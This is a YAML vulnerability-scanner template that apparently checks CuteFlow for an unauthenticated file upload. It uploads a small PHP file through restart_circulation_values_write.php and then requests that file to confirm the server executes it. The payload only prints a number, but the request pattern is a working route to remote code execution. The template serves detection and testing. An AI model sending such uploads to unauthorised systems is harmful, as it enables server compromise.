name: yaml-poc-cuteflow-cuteflow-file_upload-CT-642551
binding: fa9c4e77-8a92-42b3-825a-b06be8a2ad45
detail:
    author: haiqing.chen
    vulnerability:
        id: 1421e94e-8d32-488c-aeee-af52354daf58
        level: critical
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /pages/restart_circulation_values_write.php
            headers:
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUUkUPO1gZBJ2x6Ci
            body: "------WebKitFormBoundaryUUkUPO1gZBJ2x6Ci\r\nContent-Disposition: form-data; name=\"attachment1\"; filename=\"test1.php\"\r\nContent-Type: text/php\r\n\r\n<?php echo 1234*3456; ?>\r\n------WebKitFormBoundaryUUkUPO1gZBJ2x6Ci--"
            follow_redirects: true
        expression: response.status == 200
    r1:
        request:
            cache: true
            method: GET
            path: /upload/___1/test1.php
            follow_redirects: true
        expression: response.status == 200 && response.body_string.contains("4264704")
expression: r0() && r1()
